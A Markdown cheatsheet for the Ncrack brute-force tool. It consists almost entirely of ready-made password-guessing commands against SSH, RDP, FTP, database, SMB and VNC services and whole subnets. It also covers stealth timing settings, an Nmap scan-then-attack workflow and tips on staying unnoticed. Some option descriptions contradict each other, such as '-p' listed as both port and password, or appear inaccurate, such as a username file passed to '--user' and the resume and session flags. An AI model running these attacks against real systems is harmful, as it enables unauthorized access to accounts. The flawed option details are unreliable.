# Ncrack Cheatsheet

## Quick Reference

### SSH Brute Force

```bash
# Single user, password list
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt 192.168.1.100

# User list, password list
ncrack -p 22 --user users.txt -P passwords.txt 192.168.1.100

# Custom port
ncrack -p 2222 --user admin -P passwords.txt 192.168.1.100
```

### RDP Brute Force

```bash
ncrack -p 3389 --user administrator -P passwords.txt 192.168.1.100
```

### FTP Brute Force

```bash
ncrack -p 21 --user admin -P passwords.txt 192.168.1.100
```

### HTTP Brute Force

```bash
ncrack -p 80 --user admin -P passwords.txt 192.168.1.100
```

### MySQL Brute Force

```bash
ncrack -p 3306 --user root -P passwords.txt 192.168.1.100
```

### MSSQL Brute Force

```bash
ncrack -p 1433 --user sa -P passwords.txt 192.168.1.100
```

### SMB Brute Force

```bash
ncrack -p 445 --user administrator -P passwords.txt 192.168.1.100
```

### VNC Brute Force

```bash
ncrack -p 5900 --user "" -P passwords.txt 192.168.1.100
```

### Multiple Targets

```bash
# From file
ncrack -p 22 --user root -P passwords.txt -iL targets.txt

# CIDR notation
ncrack -p 22 --user root -P passwords.txt 192.168.1.0/24
```

### Timing Templates

```bash
# Paranoid (slowest, stealthiest)
ncrack -p 22 --user root -P passwords.txt -T 0 192.168.1.100

# Sneaky
ncrack -p 22 --user root -P passwords.txt -T 1 192.168.1.100

# Polite
ncrack -p 22 --user root -P passwords.txt -T 2 192.168.1.100

# Normal (default)
ncrack -p 22 --user root -P passwords.txt -T 3 192.168.1.100

# Aggressive
ncrack -p 22 --user root -P passwords.txt -T 4 192.168.1.100

# Insane (fastest)
ncrack -p 22 --user root -P passwords.txt -T 5 192.168.1.100
```

### Output Formats

```bash
# XML output
ncrack -p 22 --user root -P passwords.txt -oX results.xml 192.168.1.100

# Normal output
ncrack -p 22 --user root -P passwords.txt -oN results.txt 192.168.1.100

# Grepable output
ncrack -p 22 --user root -P passwords.txt -oG results.grep 192.168.1.100

# All formats
ncrack -p 22 --user root -P passwords.txt -oA results 192.168.1.100
```

### Session Management

```bash
# Resume interrupted session
ncrack -p 22 --user root -P passwords.txt -i resume/ 192.168.1.100

# Save session
ncrack -p 22 --user root -P passwords.txt -o results/ 192.168.1.100
```

### Stop on First Found

```bash
# Stop after first found per host
ncrack -p 22 --user root -P passwords.txt -f 192.168.1.100

# Stop after first found globally
ncrack -p 22 --user root -P passwords.txt -F 192.168.1.100
```

## Command Options

| Option | Description |
|--------|-------------|
| `-p PORT` | Specify port(s) to attack |
| `-u USER` | Single username |
| `-U FILE` | Username list file |
| `-p PASS` | Single password |
| `-P FILE` | Password list file |
| `-C FILE` | Colon-separated `user:pass` file |
| `-M FILE` | Target list file |
| `-i DIR` | Input directory for resume |
| `-o DIR` | Output directory for results |
| `-oX FILE` | XML output file |
| `-oN FILE` | Normal output file |
| `-oG FILE` | Grepable output file |
| `-oA FILE` | Output in all formats |
| `-f` | Exit after first found per host |
| `-F` | Exit after first found globally |
| `-s` | Skip host after first found |
| `-T TEMPLATE` | Timing template (0-5) |
| `-v` | Verbose output |
| `-d` | Debug mode |
| `-n` | No DNS resolution |
| `-V` | Show version |
| `-h` | Show help |

## Timing Templates

| Template | Name | Speed | Stealth |
|----------|------|-------|---------|
| 0 | paranoid | Slowest | Highest |
| 1 | sneaky | Slow | High |
| 2 | polite | Moderate | Medium |
| 3 | normal | Default | Low |
| 4 | aggressive | Fast | Lower |
| 5 | insane | Fastest | Lowest |

## Supported Protocols

| Protocol | Default Port |
|----------|--------------|
| SSH | 22 |
| RDP | 3389 |
| FTP | 21 |
| Telnet | 23 |
| HTTP | 80 |
| HTTPS | 443 |
| MySQL | 3306 |
| MSSQL | 1433 |
| PostgreSQL | 5432 |
| SMB | 445 |
| VNC | 5900 |
| LDAP | 389 |
| POP3 | 110 |
| IMAP | 143 |
| SMTP | 25 |

## Common Workflows

### Nmap + Ncrack

```bash
# 1. Scan for open services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oA scan

# 2. Attack discovered services
ncrack -p 22 --user root -P passwords.txt 192.168.1.0/24
```

### Multi-Service Attack

```bash
ncrack -p 22,3389,21 --user root -P passwords.txt 192.168.1.100
```

### Stealth Attack

```bash
ncrack -p 22 --user root -P passwords.txt -T 0 192.168.1.100
```

## Troubleshooting

### Common Errors

**"Connection refused"**:
```bash
nmap -p 22 192.168.1.100
ssh root@192.168.1.100
```

**"No credentials found"**:
```bash
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt -T 0 192.168.1.100
```

**"Too many connections"**:
```bash
ncrack -p 22 --user root -P passwords.txt -T 2 192.168.1.100
```

## OpSec Tips

1. **Use timing templates**: Start with `-T 2` (polite) for stealth
2. **Reduce parallelism**: Use `-T 0` for maximum stealth
3. **Log everything**: Use `-oN` or `-oX` for audit trail
4. **Stop on first found**: Use `-f` to verify findings manually

## Resources

- **GitHub**: https://github.com/nmap/ncrack
- **Kali Docs**: https://www.kali.org/tools/ncrack/
- **Man Page**: `man ncrack`
- **Developer's Guide**: https://nmap.org/ncrack/devguide.html
